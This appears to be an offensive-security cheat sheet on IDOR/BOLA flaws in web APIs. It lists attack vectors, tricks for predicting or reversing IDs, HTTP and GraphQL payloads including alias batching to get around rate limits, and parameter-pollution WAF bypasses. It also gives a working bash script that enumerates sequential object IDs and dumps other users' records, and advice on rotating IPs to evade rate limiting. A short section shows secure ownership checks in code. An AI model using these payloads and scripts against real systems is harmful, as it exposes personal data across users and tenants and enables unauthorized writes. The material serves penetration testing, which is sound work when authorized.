# idor-bola — auth

# IDOR/BOLA — ID Pattern Reference, Enumeration, and Triage

## 1. BOLA Attack Map

| Vector | Example endpoint | What is sent | What appears (success) | Fails because |
|---|---|---|---|---|
| Sequential | `GET /api/orders/1042` | `Authorization: Bearer <own>` | `200` body order user lain | `403`/`404` konsisten, UUID |
| UUID guess | `GET /api/orders/6f1c...` | own UUID v4 | 404 for random UUID | 122-bit entropy, v4 |
| UUIDv1/v7 leak | `GET /files/<v1-uuid>` | UUID v1 from timestamp | enumerable via pattern | UUIDv4/V7 |
| Hashid | `GET /user/abc123==` | own hashid | reverse to int, increment | salt rotation, HMAC |
| Nested | `GET /users/10/orders/55` | parent=own, child=victim | child owner not checked | ownership walk |
| `/me` swap | `GET /api/me?user_id=1043` | own token + `?user_id=victim` | server honor query | strict context user |
| Batch | `POST /graphql` | alias batch 50 ids | partial success leaks | rate limit per-mutation |
| GraphQL node | `node(id:"VXNlcjoxMDQz")` | base64 `User:1043` | resolve without authz | persisted only |
| Search enum | `GET /search?q=a&owner=*` | wildcard/empty owner | list all | owner from token |
| Export | `GET /export.csv?from=0&to=999999` | range besar | seluruh tenant | scope token |
| Report | `GET /reports/2024.pdf?account=1043` | account param | PDF user lain | signed URL |
| Param pollution | `?id=1042&id=1043` | two values | backend uses last | parser normalization |

## 2. Pola ID Konkret

**Sequential (int)** — rentan. Deteksi:
```bash
ffuf -u https://t/api/users/FUZZ -H "Authorization: Bearer $T" \
  -w <(seq 1000 1100) -mc 200 -fr "not found" -o seq.json
```

**UUID v4** — safe unless leaked via log/share link. Random enumeration test = waste; focus on *leaked UUID* (sitemap, JS bundle, error stack).

**UUID v1** — 60-bit timestamp + node MAC. Predictable. Reverse from 2 samples:
```python
# uuid1 decode: time_low(32) time_mid(16) time_hi(12) clock_seq(14) node(48)
import uuid
u = uuid.UUID("6f1c2a3b-4c5d-11ef-8a2b-0242ac120002")
print(u.time, u.node, u.clock_seq)
```

**UUIDv7** — unix_ts_ms 48-bit prefix; enumerate time window. Check byte order in header.

**Hashid (Sqids/hashids)** — reversible if salt leaks. Detect pattern `^[a-zA-Z0-9]{6,12}$` with consistent length. Try the library default salt:
```python
from hashids import Hashids
h = Hashids(salt="this is my salt")  # default docs
print(h.encode(1043))
```

**Nested** — `/orgs/{o}/projects/{p}/issues/{i}`. Kirim `o=own`, `p`/`i` milik victim. Cek apakah server walk: `issue ∈ project ∈ org ∈ user`.

## 3. `/me` vs `/{id}` Swap

```http
GET /api/v1/users/me          Authorization: Bearer U1
GET /api/v1/users/1043        Authorization: Bearer U1   # 200 = BOLA
GET /api/v1/users/me?user_id=1043                        # 200 = context confusion
PATCH /api/v1/me {"id":1043,"email":"x@y"}               # mass-assign + BOLA
```
Why it works: the `/me` handler often bypasses authz then forwards to a service that trusts `user_id` from body/query. Why it fails: normalization middleware that overwrites `user_id` from JWT before the controller.

## 4. Batch & GraphQL

**Batch REST** (JSON array or `?ids=`):
```http
POST /api/users/batch
[{"id":1042},{"id":1043},{"id":1044}]
```
Server returns partial `200` — *partial success* = leak oracle. Check the `errors[]` field per-item; don't stop at the first response.

**GraphQL node interface:**
```graphql
{ node(id:"VXNlcjoxMDQz"){ ... on User { email phone } } }
```
`VXNlcjoxMDQz` = base64(`User:1043`). Many servers encode `__typename:id` in the global ID — decode, increment, re-encode.

**Alias batch (bypass rate limit per-request):**
```graphql
mutation {
  a:updateUser(id:1043,email:"a@x"){id}
  b:updateUser(id:1044,email:"a@x"){id}
  # ... 50 alias
}
```
Why it fails in the field: depth-limit + cost-based rate limit (Apollo Router 1.x, graphql-armor) counts per-mutation, not per-HTTP.

## 5. Enumerasi via Search/Export/Report

**Search wildcard / scope leak:**
```http
GET /api/search?q=&owner=&limit=1000
GET /api/search?q=*&filter[user_id]=
```
Check: whether `owner` is taken from session or query. Compare count `{}` vs `{owner:me}`.

**Export range:**
```http
GET /api/export/orders.csv?from=2024-01-01&to=2024-12-31&account=*
GET /api/export?limit=999999&offset=0
```
Why it works: export workers often process async with a service-account token, authz only at enqueue not at query.

**Report generator:**
```http
GET /api/reports/statement.pdf?account_id=1043
GET /api/reports?id[]=1042&id[]=1043
```
Signed-URL S3 (AWS SDK v2 default presign 15 min) → swap `account_id` in path before sign.

**Param pollution** (backend beda parser):
```http
GET /api/users?id=1042&id=1043           # PHP: last, ASP.NET: comma, Node qs: array
GET /api/users?id=1042%26id=1043         # WAF bypass
GET /api/users?id[]=1042&id[]=1043
GET /api/users?id=1042;id=1043
```
Check diff between tiers: WAF (ModSecurity CRS 4.x) vs app (Express 4 `/framework`) vs cache (nginx 1.25 `proxy_cache_key $request_uri`).

## 6. Ownership & Tenant Isolation — Checklist Kode

```python
# SALAH: hanya authn
order = Order.objects.get(id=order_id)

# BENAR: scope ke principal
order = Order.objects.get(id=order_id, user_id=request.user.id)

# BENAR multi-tenant
order = Order.objects.get(id=order_id, user_id=request.user.id, tenant_id=request.tenant.id)
```
Red flags in review:
- ORM `.find_by_pk()` without `user`/`tenant` filter.
- `select * from x where id=?` + authz check in a separate layer that can be skipped.
- Tenant check using `X-Tenant-ID` header without validation against JWT.
- Cache key `order:{id}` without `tenant:` prefix → cross-tenant cache poisoning (Varnish 7.x, Redis `GET order:1043`).

## 7. Skrip Enumerasi + Triage

```bash
#!/usr/bin/env bash
# idor-enum.sh — enumerasi sequential + triage impact
TARGET="$1"; TOK="$2"; START="${3:-1}"; END="${4:-200}"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"

declare -A seen
for i in $(seq "$START" "$END"); do
  body=$(curl -sS -m 5 -A "$UA" -H "Authorization: Bearer $TOK" \
    -w '\n%{http_code}\n%{size_download}' \
    "$TARGET/$i")
  code=$(echo "$body" | tail -2 | head -1)
  size=$(echo "$body" | tail -1)
  json=$(echo "$body" | head -n -2)
  [ "$code" = "200" ] || continue
  # fingerprint object
  owner=$(echo "$json" | jq -r '.owner_id // .user_id // empty' 2>/dev/null)
  key="owner=$owner size=$size"
  if [ -z "${seen[$key]}" ]; then seen[$key]=1;
    echo "[$i] code=$code size=$size $key :: $(echo "$json" | jq -c '{id,email,tenant}')"
    echo "$json" >> "dump-$START-$END.jsonl"
  fi
done
```

**Triage impact (rubrik 5 menit):**

| Level | Criteria | Evidence that must be held |
|---|---|---|
| Critical | Cross-tenant PII massal / write | ≥2 tenant, ≥100 record, `PATCH`/`DELETE` sukses |
| High | Mass cross-user PII read | PII in body (email, phone, addr), CSV export |
| Medium | Single-object read, non-PII | Order metadata, low-sensitivity |
| Low | Info disclosure marginal | ID exists leak, no body |

Save: request+response pair per ID, `jq -c` body, `etag`/`x-request-id` header. Screenshot in Chrome 131 DevTools (Network → copy as cURL) as evidence.

## 8. Operational Pitfalls (field failures)

1. **Cache layer masks the bug.** nginx 1.25 `proxy_cache_key` default `$scheme$request_method$host$request_uri` — `?id=1043` can be cached from another user → false positive *or* false negative. Always test with `Cache-Control: no-cache` + nonce query variation.
2. **CDN normalization.** CloudFront/Cloudflare normalize `?id=1042&id=1043`; edge parser takes the first, origin takes the last — result in browser differs from curl.
3. **WAF 403 misread.** ModSecurity CRS 4.x blocks `../` and base64 GraphQL patterns. 403 ≠ patched; test from a clean IP.
4. **UUID enumerasi keliru.** Menembak 10.000 UUIDv4 acak = 0 hit → salah simpul "aman". Selalu cari sumber UUID (JS bundle, sitemap, HAR, error 500 stack).
5. **Batch partial success.** A `200` response with a `null` array is considered failure; when in fact items succeeded. Check per-item, not overall code.
6. **Token scope rotation.** Refresh token every 15 minutes; long scripts (>100 req) fail midway → partial results. Use `client_credentials` for testing, or a refresh handler.
7. **Rate limit per-IP vs per-token.** Test enumeration from office IP → 429 at req 20. Change IP (`curl --interface`, residency proxy) or lower concurrency.
8. **Staging ≠ prod.** Staging shadow data uses random IDs + dummy; BOLA bugs only appear in prod with auto-increment. Don't conclude safe from staging.
9. **GraphQL persisted queries.** Ad-hoc queries are blocked (`PersistedQueryNotFound`). Must use already-registered queries; alias-batch dead → find a legal query shape that has large `first`/`last`.
10. **Object ownership cached.** Redis `GET order:{id}` without tenant prefix — the first request belonging to victim fills the cache; the second request (own) returns victim data. Reproduce: A requests first, then B.

---

## [reasoning trace]


